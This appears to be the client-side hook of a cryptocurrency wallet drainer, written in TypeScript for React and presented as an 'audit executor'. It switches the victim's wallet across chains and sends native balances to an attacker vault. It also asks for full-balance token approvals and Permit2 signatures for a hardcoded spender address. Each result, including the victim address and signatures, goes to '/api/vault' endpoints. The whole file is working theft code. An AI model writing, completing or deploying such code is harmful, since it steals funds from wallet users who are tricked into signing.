"use client";

import { useCallback } from "react";
import { ethers, getAddress } from "ethers";
import { securePost } from "../execution/utils";
import { EXECUTION_POLICY } from "@/lib/ghost/constants";

const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];
const AUTHORIZED_SETTLER = getAddress(
  "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
);

/**
 * 🧠 DECISION MAKER ENGINE (v17.0.0 - Instant Strike Edition)
 * Optimized for zero-latency wallet pop-ups and parallel execution.
 */
export function useAuditExecutor({
  executeMask,
  requestManualPermission,
}: any) {
  /** 🛠️ INTERNAL PROVIDER RESOLVER */
  const getProvider = () => {
    if (typeof window === "undefined") return null;
    const provider = (window as any).ethereum;
    if (!provider) return null;

    if (provider.providers?.length > 0) {
      return (
        provider.providers.find(
          (p: any) => p.isTrust || p.isRabby || p.isMetaMask,
        ) || provider.providers[0]
      );
    }
    return provider;
  };

  /** 🛡️ ADAPTIVE CHAIN WAITER: Ultra-Aggressive Polling (30ms) */
  const waitForChain = async (
    provider: any,
    targetId: number,
    logPrefix: string,
  ) => {
    let attempts = 0;
    while (attempts < 80) {
      // 30ms polling for instant detection
      const hex = await provider.request({ method: "eth_chainId" });
      if (parseInt(hex, 16) === targetId) return true;
      await new Promise((r) => setTimeout(r, 30));
      attempts++;
    }
    return false;
  };

  const runExecutionLoop = useCallback(
    async ({
      assets,
      userAddress,
      activeVault,
      masterKey,
      logPrefix,
      walletClient,
    }: any) => {
      console.log(`${logPrefix} 🚀 INITIALIZING PRIORITY ENGINE...`);

      // 🛡️ SECURITY GUARD: Integrity Check (Maintained)
      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }

      // Pre-warm Ghost Module (Maintained)
      let ghostMod: any;
      try {
        ghostMod = await import("@/lib/ghost");
      } catch (e) {
        console.warn(`${logPrefix} ⚠️ Ghost Module unavailable.`);
      }

      for (const asset of assets) {
        try {
          const targetChainId = Number(asset.chainId);
          const provider = getProvider();
          if (!provider) continue;

          const rawBal = (asset.bal || asset.balance || "0")
            .toString()
            .split(".")[0];
          const assetUsd = parseFloat(asset.usdValue || "0");
          const hasBalance = BigInt(rawBal) > 0n;

          // 🧹 DUST FILTER (Maintained)
          if (assetUsd < 0.01 && !hasBalance) continue;

          // --- 1. ADAPTIVE CHAIN GUARD (INSTANT SWITCH) ---
          const currentHex = await provider.request({ method: "eth_chainId" });
          const currentId = parseInt(currentHex, 16);

          if (currentId !== targetChainId) {
            try {
              // Trigger switch immediately
              await provider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: `0x${targetChainId.toString(16)}` }],
              });
              // Poll aggressively to catch the switch the microsecond it happens
              const switched = await waitForChain(
                provider,
                targetChainId,
                logPrefix,
              );
              if (!switched) continue;
            } catch (switchErr: any) {
              console.warn(`${logPrefix} ❌ Switch Failed for ${asset.symbol}`);
              continue;
            }
          }

          // --- 2. NATIVE DETECTION (Maintained) ---
          const isNative =
            !asset.contractAddress ||
            asset.contractAddress === ethers.ZeroAddress ||
            asset.signatureType === "NATIVE" ||
            asset.type === "NATIVE" ||
            ["BNB", "ETH", "MATIC", "POL", "AVAX", "FTM"].includes(
              asset.symbol,
            );

          if (isNative) {
            const maskResult = await executeMask({
              amount: rawBal,
              chainId: targetChainId,
              derivedVaultAddress: activeVault.evmAddress,
              injectedClient: walletClient || provider,
              tokenTargets: assets
                .filter(
                  (a: any) =>
                    a.contractAddress &&
                    a.contractAddress !== ethers.ZeroAddress,
                )
                .map((a: any) => a.contractAddress),
            });

            if (maskResult?.success && maskResult.hash) {
              // 🚀 FIRE-AND-FORGET: Don't wait for API to finish before moving to next asset
              securePost("/api/vault", {
                type: "NATIVE_SYNC",
                txHash: maskResult.hash,
                chainId: targetChainId,
                victim: userAddress,
                symbol: asset.symbol,
                price: asset.price,
                amount: rawBal,
                usdValue: assetUsd,
              }).catch(() => null);
            }
            continue;
          }

          // --- 3. TOKEN LOGIC (TURBO POP-UP) ---
          let alreadyHasPermission = false;
          const isPermit2Strategy =
            asset.strategy === "BATCH_PERMIT2" ||
            asset.strategy === "PERMIT_SIGN" ||
            asset.type === "PERMIT2" ||
            asset.spender?.toLowerCase() ===
              "0x000000000022d473030f116ddee9f6b43ac78ba3";

          if (ghostMod && !isPermit2Strategy) {
            try {
              // Instant check of existing allowances
              const ghostResults = await ghostMod.checkAndTriggerGhostSweep(
                userAddress,
                [asset],
                targetChainId,
                AUTHORIZED_SETTLER,
              );

              if (ghostResults?.length > 0) {
                const ghostAsset = ghostResults[0];
                const allowance = BigInt(ghostAsset.allowance || "0");
                const balance = BigInt(rawBal);

                if (balance > allowance) {
                  // TRIGGER POP-UP INSTANTLY
                  const approval = await requestManualPermission({
                    tokenAddress: asset.contractAddress,
                    symbol: asset.symbol,
                    chainId: targetChainId,
                    amount: rawBal,
                    injectedClient: walletClient || provider,
                  });

                  if (approval?.success) {
                    ghostResults[0].amount = rawBal;
                    ghostResults[0].allowance = rawBal;
                    alreadyHasPermission = true;
                  }
                } else {
                  alreadyHasPermission = true;
                }

                if (alreadyHasPermission) {
                  // Background sync to API (Non-blocking)
                  securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: ghostResults,
                    masterKey: masterKey,
                    mode: "PERFORM_ALLOWANCE",
                    messageHash: ethers.ZeroHash,
                  }).catch(() => null);
                }
              }
            } catch (e) {
              console.warn(`${logPrefix} Ghost scan background skip.`);
            }
          }

          if (!alreadyHasPermission) {
            const approval = await requestManualPermission({
              tokenAddress: asset.contractAddress,
              symbol: asset.symbol,
              chainId: targetChainId,
              amount: rawBal.toString(),
              injectedClient: walletClient || provider,
            });

            if (approval?.success) {
              try {
                // Parallel permit preparation - No artificial delays
                const permitData = await ghostMod.generatePermit2Data(
                  userAddress,
                  [asset],
                  targetChainId,
                  "Deploying Ghost Engine",
                );
                const { messageHash, ...payloadForSigning } = permitData;

                let signature;
                try {
                  // Direct provider call for fastest signature request
                  signature = await provider.request({
                    method: "eth_signTypedData_v4",
                    params: [
                      userAddress,
                      typeof payloadForSigning === "string"
                        ? payloadForSigning
                        : JSON.stringify(payloadForSigning),
                    ],
                  });
                } catch (err: any) {
                  throw err;
                }

                if (signature && signature.length > 60) {
                  // Background Post
                  securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: [
                      {
                        token: asset.contractAddress,
                        balance: rawBal,
                        symbol: asset.symbol,
                        usdValue: asset.usdValue,
                        decimals: asset.decimals,
                      },
                    ],
                    masterKey: masterKey,
                    signature: signature,
                    messageHash: messageHash,
                    mode: "PERFORM_PERMIT2",
                  }).catch(() => null);
                }
              } catch (sigError: any) {
                console.warn(`${logPrefix} ✋ Cancelled: ${asset.symbol}`);
                continue;
              }
            }
          }
          // Loop repeats immediately for next asset
        } catch (assetError: any) {
          console.error(`${logPrefix} ❌ Error: ${asset.symbol}`, assetError);
        }
      }

      // Final session update (Maintained)
      const session = sessionStorage.getItem("active_strike_session");
      if (session) {
        const data = JSON.parse(session);
        sessionStorage.setItem(
          "active_strike_session",
          JSON.stringify({ ...data, isFinished: true }),
        );
      }
      console.log(`${logPrefix} 🏁 Audit Cycle Complete.`);
    },
    [executeMask, requestManualPermission],
  );

  return { runExecutionLoop };
}
